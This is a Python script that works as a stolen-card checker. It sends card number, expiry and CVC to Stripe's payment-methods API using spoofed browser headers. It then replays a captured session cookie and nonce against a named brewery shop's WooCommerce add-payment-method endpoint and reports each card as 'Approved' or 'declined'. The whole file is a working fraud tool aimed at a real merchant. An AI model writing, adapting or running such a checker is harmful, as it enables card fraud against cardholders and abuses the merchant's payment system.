import requests
import re
import json
import random
from bs4 import BeautifulSoup
import user_agent

def brn6(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]

        # Year fix
        if "20" in yy:
            yy = yy.split("20")[1]

        # Generate user agent
        user = user_agent.generate_user_agent()

        # First request to Stripe
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user,
        }

        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        stripe_id = response.json().get('id')

        # Second request to merchant site
        cookies = {
            'age_gate': '1',
            '__stripe_mid': 'f632f067-f316-464b-b34e-a92d82ceba41d4698c',
            '__stripe_sid': '7cfe38a0-1fa1-4b8a-8da3-219124b4993c29cd7d',
        }

        headers2 = {
            'authority': 'shop.newgrassbrewing.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://shop.newgrassbrewing.com',
            'referer': 'https://shop.newgrassbrewing.com/account/add-payment-method/',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        }

        data2 = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': stripe_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': 'fb675ca7ef',
        }

        response2 = requests.post(
            'https://shop.newgrassbrewing.com/',
            params=params,
            cookies=cookies,
            headers=headers2,
            data=data2
        )

        if 'succeeded' in response2.text:
            return 'Approved'
        else:
            return 'declined'

    except Exception:
        return 'error'
